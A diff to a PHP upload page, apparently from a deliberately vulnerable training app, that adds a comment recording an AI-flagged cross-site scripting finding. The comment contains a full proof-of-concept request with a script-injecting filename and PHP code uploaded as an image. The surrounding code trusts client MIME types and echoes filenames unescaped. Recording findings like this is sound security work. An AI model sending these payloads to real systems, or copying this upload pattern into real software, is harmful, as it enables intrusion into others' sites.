@@ -37,6 +37,26 @@
 					$destination = 'uploads/' . $_FILES['userfile']['name'];
 					if (in_array($_FILES['userfile']['type'], $valid_mime_types)) {
 						move_uploaded_file($_FILES['userfile']['tmp_name'], $destination);
+						// TODO: AI issue #3, High, Cross-site Scripting, https://github.com/rbm1718/bricks/issues/3
+						//
+						// POST /upload-2/index.php HTTP/1.1
+						// Host: localhost
+						// Accept-Encoding: identity
+						// Connection: close
+						// Content-Length: 296
+						// Content-Type: multipart/form-data; boundary=1b6eb8119f654de0bca79fd349c2503e
+						//
+						// --1b6eb8119f654de0bca79fd349c2503e
+						// Content-Disposition: form-data; name="upload"
+						//
+						// 935137890000
+						// --1b6eb8119f654de0bca79fd349c2503e
+						// Content-Disposition: form-data; name="userfile"; filename="'onmouseover='alert(1)'"
+						// Content-Type: image/gif
+						//
+						// <?php phpinfo(); ?>
+						// --1b6eb8119f654de0bca79fd349c2503e--
+						//
 						echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
 					}else {
 						echo "<div class=\"alert-box alert\">Upload failed.<a href=\"\" class=\"close\">&times;</a></div>";
